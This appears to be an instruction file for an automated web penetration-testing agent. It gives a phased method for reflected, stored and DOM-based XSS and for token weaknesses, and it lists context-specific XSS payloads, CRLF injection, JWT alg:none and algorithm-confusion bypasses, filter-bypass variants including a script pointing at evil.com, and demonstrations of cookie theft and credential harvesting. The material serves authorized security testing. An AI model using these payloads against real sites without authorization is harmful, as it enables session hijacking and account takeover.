## Reflection Testing Methodology (Grey-Box)

### Phase 1: Context Analysis
Before injecting, understand WHERE input lands in the response:
1. Submit a unique canary string (e.g. ``xss7k3m9q``) in each parameter.
2. Search the response HTML / headers / body for the canary.
3. Classify the context:
   - **HTML body**: ``<div>CANARY</div>`` — needs script tag or event handler
   - **HTML attribute**: ``<input value="CANARY">`` — needs quote to break out
   - **JavaScript string**: ``var x = "CANARY"`` — needs quote to escape
   - **JavaScript template literal**: backtick-delimited — needs backtick escape
   - **URL context**: ``<a href="CANARY">`` — needs ``javascript:`` protocol
   - **CSS context**: ``style="color: CANARY"`` — needs ``expression()`` / ``url()``
   - **Response header**: ``Set-Cookie`` / ``Location`` / custom header — CRLF injection potential
   - **JSON context**: rendered client-side → check for improper escaping
   - **No reflection**: not reflected — check whether stored for later display

```bash
graph-tool test-attempt \
  --target "parameter:search_q" \
  --vuln-type reflection \
  --technique "context-analysis" \
  --payload "xss7k3m9q" \
  --verdict inconclusive \
  --response-code 200 \
  --response-excerpt "Canary found in HTML body: <div class='result'>xss7k3m9q</div>"
```

### Phase 2: Reflected Payload Families
For each reflection context, use context-appropriate payloads:

**HTML Body Context:**
- ``<script>alert(document.domain)</script>``
- ``<img src=x onerror=alert(document.domain)>``
- ``<svg onload=alert(document.domain)>``
- ``<details open ontoggle=alert(document.domain)>``

**HTML Attribute Context:**
- ``" onmouseover="alert(document.domain)`` (break attribute)
- ``"><script>alert(document.domain)</script>`` (break tag)
- ``" autofocus onfocus="alert(document.domain)`` (auto-trigger)

**JavaScript String Context:**
- ``";alert(document.domain)//`` (break string, inject)
- ``'-alert(document.domain)-'`` (arithmetic context)
- ``</script><script>alert(document.domain)</script>`` (break script block)

**URL / Href Context:**
- ``javascript:alert(document.domain)``
- ``data:text/html,<script>alert(document.domain)</script>``

**Header Reflection:**
- Send ``X-Reflect: <script>alert(1)</script>`` and look for the value
  being echoed in a subsequent response.
- CRLF injection: ``%0d%0aSet-Cookie:%20evil=1`` in parameters that
  flow into response headers.

**JSON / AJAX Context:**
- Payloads that survive ``JSON.stringify`` but execute when the value is
  written into ``innerHTML`` or eval-like sinks client-side.

```bash
graph-tool test-attempt \
  --target "parameter:search_q" \
  --vuln-type reflection \
  --technique "reflected-xss: html-body" \
  --payload "<img src=x onerror=alert(document.domain)>" \
  --verdict conclusive_vulnerable \
  --response-code 200 \
  --response-excerpt "Alert triggered with document.domain value"
```

### Phase 3: Stored Reflection Testing
For parameters that accept persistent data (profiles, comments, messages):
1. Inject payload into the stored field.
2. Navigate to the page where the data is displayed.
3. Confirm the payload executes on page load or interaction.
4. Test with different viewer contexts (admin viewing user data, etc.).

```bash
graph-tool finding \
  --target "parameter:profile_bio" \
  --vuln-type reflection \
  --severity high \
  --cwe CWE-79 \
  --title "Stored XSS in user profile biography" \
  --poc-payload "<img src=x onerror=alert(document.cookie)>" \
  --impact "Session hijacking — stored payload executes when admin views user profile" \
  --grants '["session_hijack","user_impersonation"]' \
  --requires '["authenticated"]' \
  --evidence-file "deliverables/screenshots/reflection-stored-profile.png" \
  --derived-from "test_attempt:ta_XXXX"
```

### Phase 4: DOM-based Reflection
Check for client-side sinks:
1. Look for JavaScript that reads ``location.hash``, ``location.search``,
   or ``document.referrer``.
2. Check if these values flow into dangerous sinks: ``innerHTML``, ``eval``,
   ``setTimeout``, or DOM write methods.
3. Test with payloads in URL fragments:
   ``#<img src=x onerror=alert(1)>``.
4. Test with URL parameters processed client-side.

### Phase 5: Token Reflection and Integrity
Inspect tokens the server issues and those reflected back to the client.
Collect multiple samples and analyse:

**JWT Analysis:**
- Decode the JWT header (base64) to check algorithm.
- Look for weak algorithms: ``HS256`` with guessable keys, ``alg: none``.
- Test algorithm-confusion: if ``RS256``, try the public key as an
  ``HS256`` secret.
- Test ``alg: none`` bypass (strip signature, set ``alg`` to ``none``).
- Test with modified payload but the original signature (integrity check).
- Test expired-token acceptance (remove or roll back ``exp``).

```bash
graph-tool test-attempt \
  --target "endpoint:POST_api_login" \
  --vuln-type reflection \
  --technique "jwt-alg-none-bypass" \
  --payload "JWT with alg:none and stripped signature" \
  --verdict conclusive_clean \
  --response-code 401 \
  --response-excerpt "Token rejected — signature verification required"
```

**Session Token Entropy:**
- Collect 20+ session tokens and analyse distribution / sequence.
- Look for base64-encoded timestamps or sequential counters.

**Cookie Security Attributes:**
- ``Secure`` flag (HTTPS only).
- ``HttpOnly`` flag (JS-invisible).
- ``SameSite`` attribute (CSRF protection level).
- Scope (Domain/Path too broad?).
- Expiration (session cookies should be ephemeral).

**Password-Reset Token Predictability:**
- Generate multiple tokens; compare length, entropy, pattern.
- Test cross-user reuse and post-reset re-use.

```bash
graph-tool finding \
  --target "endpoint:POST_api_reset_password" \
  --vuln-type reflection \
  --severity high \
  --cwe CWE-330 \
  --title "Predictable password reset tokens" \
  --poc-payload "Reset tokens are base64(timestamp + sequential_id) — next token predictable" \
  --impact "Account takeover via predicted reset token" \
  --grants '["user_impersonation"]' \
  --requires '[]' \
  --evidence-file "deliverables/screenshots/reflection-reset-token.png" \
  --derived-from "test_attempt:ta_XXXX"
```

### Phase 6: Filter Bypass Techniques
If basic payloads are blocked, try at least 8 bypass techniques before
classifying as FALSE_POSITIVE:
- Case variation: ``<ScRiPt>alert(1)</sCrIpT>``
- Tag alternatives: ``<svg>``, ``<math>``, ``<details>``, ``<marquee>``
- Event handler alternatives: ``onerror``, ``onload``, ``onfocus``,
  ``onmouseover``, ``ontoggle``
- HTML entity encoding: ``&#x3c;script&#x3e;``, ``%3Cscript%3E``
- Double encoding: ``%253Cscript%253E``
- Null bytes: ``<scri%00pt>``
- Unicode bypass: ``<script/src=//evil.com>``
- Mutation XSS: ``<noscript>`` tag-confusion payloads

### Phase 7: Impact Demonstration
For confirmed reflection / execution, demonstrate practical impact:
- Cookie theft via ``document.cookie``.
- Session token access (check ``HttpOnly``).
- Page content manipulation / defacement.
- Form credential harvesting.
- Redirection to attacker-controlled page.

### Phase 8: Classification
- **EXPLOITED**: Script execution confirmed, token forged, or reflection
  drove a concrete takeover with proof.
- **POTENTIAL**: Input reflected / token weak but encoding or CSP
  prevents direct execution.
- **LEAD**: Input partially reflected, encoding inconsistent, or
  anomalous token behaviour worth investigating.
- **FALSE_POSITIVE**: Input properly encoded and tokens robust after
  thorough testing.

Release targets after testing:
```bash
graph-tool release --id "parameter:search_q" --agent "reflection-specialist"
```
